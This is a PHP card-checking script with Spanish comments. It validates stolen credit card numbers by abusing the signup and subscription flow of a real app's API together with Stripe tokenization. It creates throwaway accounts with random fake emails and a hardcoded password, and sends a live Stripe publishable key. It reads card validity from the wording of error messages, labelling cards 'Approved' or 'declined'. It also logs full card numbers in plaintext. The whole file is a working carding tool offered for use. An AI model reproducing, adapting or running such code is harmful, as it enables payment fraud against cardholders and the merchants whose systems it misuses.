<?php
session_start();
header('Content-Type: application/json');

// Verificar el token CSRF
if (!isset($_POST['csrf_token']) || !isset($_SESSION['csrf_token']) || $_POST['csrf_token'] !== $_SESSION['csrf_token']) {
    http_response_code(403);
    echo json_encode(['status' => 'error', 'message' => 'Your card was declined ❌']);
    exit;
}

// Función de logging para depuración
function logToFile($message) {
    file_put_contents('debug.log', date('Y-m-d H:i:s') . ' - ' . $message . "\n", FILE_APPEND);
}

// Función para capturar texto entre dos delimitadores
function capture($data, $first, $last) {
    try {
        $start = strpos($data, $first) + strlen($first);
        $end = strpos($data, $last, $start);
        if ($start === false || $end === false) {
            return null;
        }
        return substr($data, $start, $end - $start);
    } catch (Exception $e) {
        return null;
    }
}

// Función para generar una cadena aleatoria
function rr($length) {
    $characters = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
    $result = '';
    for ($i = 0; $i < $length; $i++) {
        $result .= $characters[rand(0, strlen($characters) - 1)];
    }
    return $result;
}

// Función para generar un correo aleatorio
function generateRandomEmail() {
    $firstNames = ['John', 'Jane', 'Alex', 'Sarah', 'Mike', 'Emily', 'Chris', 'Laura'];
    $lastNames = ['Smith', 'Johnson', 'Williams', 'Brown', 'Jones', 'Garcia', 'Miller', 'Davis'];
    
    $firstName = $firstNames[array_rand($firstNames)];
    $lastName = $lastNames[array_rand($lastNames)];
    $randomNumber = rand(1000000, 9999999);
    
    return strtolower("$firstName$lastName$randomNumber@gmail.com");
}

// Función principal para verificar la tarjeta
function lasting($cc, $month, $year, $cvv) {
    try {
        // Generar un correo aleatorio
        $mail = generateRandomEmail();
        $password = 'zdrNc1';
        
        // Paso 1: Registrar un usuario para obtener el JWT
        $postData = json_encode([
            'user' => [
                'email' => $mail,
                'password' => $password
            ]
        ]);
        
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, 'https://lasting-api.talkspace.com/api/v1/users');
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $postData);
        curl_setopt($ch, CURLOPT_HTTPHEADER, [
            'Content-Type: application/json',
            'Accept: application/json'
        ]);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
        $response = curl_exec($ch);
        if ($response === false) {
            $error = curl_error($ch);
            curl_close($ch);
            logToFile("Error en solicitud a Talkspace: $error");
            throw new Exception("Error en la solicitud al registrar usuario");
        }
        logToFile("Respuesta de Talkspace: " . substr($response, 0, 200));
        curl_close($ch);
        
        $jwt = capture($response, '"jwt":"', '"');
        if (!$jwt) {
            logToFile("JWT no encontrado en respuesta: " . $response);
            throw new Exception('No se pudo obtener el JWT');
        }
        
        // Paso 2: Tokenizar la tarjeta con Stripe
        $data = "card[number]=$cc&card[cvc]=$cvv&card[exp_month]=$month&card[exp_year]=$year&guid=NA&muid=NA&sid=NA&payment_user_agent=stripe.js%2F213f5d754b%3B+stripe-js-v3%2F213f5d754b&time_on_page=69987&key=pk_live_0dKqmbrnO3aTYXiPjHukEqH8&pasted_fields=number";
        
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/tokens');
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
        curl_setopt($ch, CURLOPT_HTTPHEADER, [
            'Content-Type: application/x-www-form-urlencoded',
            'Accept: application/json'
        ]);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
        $response2 = curl_exec($ch);
        if ($response2 === false) {
            $error = curl_error($ch);
            curl_close($ch);
            logToFile("Error en solicitud a Stripe: $error");
            throw new Exception("Error en la solicitud a Stripe");
        }
        logToFile("Respuesta de Stripe: " . substr($response2, 0, 200));
        curl_close($ch);
        
        $result2 = json_decode($response2, true);
        
        if (isset($result2['error'])) {
            logToFile("Error de Stripe: " . $result2['error']['message'] . ' (Code: ' . ($result2['error']['code'] ?? 'N/A') . ')');
            if (strpos($response2, "Your card's security code is invalid.") !== false) {
                return [
                    'status' => 'success',
                    'message' => 'Approved! ✅'
                ];
            } else {
                return [
                    'status' => 'error',
                    'message' => 'Your card was declined ❌'
                ];
            }
        }
        
        $idw = $result2['id'];
        
        // Paso 3: Intentar suscribirse con el token de Stripe
        $headers = [
            'authority: lasting-api.talkspace.com',
            'accept: application/json, text/plain, */*',
            'accept-language: en-US,en;q=0.9',
            "authorization: $jwt",
            'content-type: application/json',
            'origin: https://app.getlasting.com',
            'referer: https://app.getlasting.com/',
            'sec-ch-ua: "Google Chrome";v="113", "Chromium";v="113", "Not-A.Brand";v="24"',
            'sec-ch-ua-mobile: ?0',
            'sec-ch-ua-platform: "Windows"',
            'sec-fetch-dest: empty',
            'sec-fetch-mode: cors',
            'sec-fetch-site: cross-site',
            'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36'
        ];
        
        $jsonData = json_encode([
            'stripe_token' => $idw,
            'subscription_type' => '3999-one-month-with-trial'
        ]);
        
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, 'https://lasting-api.talkspace.com/api/v1/ecommerce/subscribe');
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $jsonData);
        curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
        $response3 = curl_exec($ch);
        if ($response3 === false) {
            $error = curl_error($ch);
            curl_close($ch);
            logToFile("Error en solicitud de suscripción: $error");
            throw new Exception("Error en la solicitud de suscripción");
        }
        logToFile("Respuesta de suscripción: " . substr($response3, 0, 200));
        curl_close($ch);
        
        $result3 = json_decode($response3, true);
        
        if (strpos($response3, "Your card's security code is incorrect.") !== false) {
            return [
                'status' => 'success',
                'message' => 'Approved! ✅'
            ];
        } elseif (isset($result3['errors'])) {
            logToFile("Error de suscripción: " . ($result3['errors'][0] ?? 'Error desconocido'));
            return [
                'status' => 'error',
                'message' => 'Your card was declined ❌'
            ];
        } else {
            return [
                'status' => 'success',
                'message' => 'Approved! ✅'
            ];
        }
        
    } catch (Exception $e) {
        logToFile("Excepción general: " . $e->getMessage());
        return [
            'status' => 'error',
            'message' => 'Your card was declined ❌'
        ];
    }
}

// Verificar método y parámetros
if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    http_response_code(405);
    echo json_encode(['status' => 'error', 'message' => 'Your card was declined ❌']);
    exit;
}

$lista = $_POST['lista'] ?? '';
if (empty($lista)) {
    http_response_code(400);
    echo json_encode(['status' => 'error', 'message' => 'Your card was declined ❌']);
    exit;
}

// Validar formato de la tarjeta
if (!preg_match('/^[0-9]{15,16}\|[0-9]{2}\|[0-9]{2,4}\|[0-9]{3,4}$/', $lista)) {
    http_response_code(400);
    echo json_encode(['status' => 'error', 'message' => 'Your card was declined ❌']);
    exit;
}

// Parsear los datos de la tarjeta
list($cc, $month, $year, $cvv) = explode('|', $lista);
logToFile("Procesando tarjeta: $lista");

// Llamar a la función de verificación
$result = lasting($cc, $month, $year, $cvv);

// Enviar respuesta al frontend
echo json_encode([
    'status' => $result['status'],
    'message' => $result['message']
]);
?>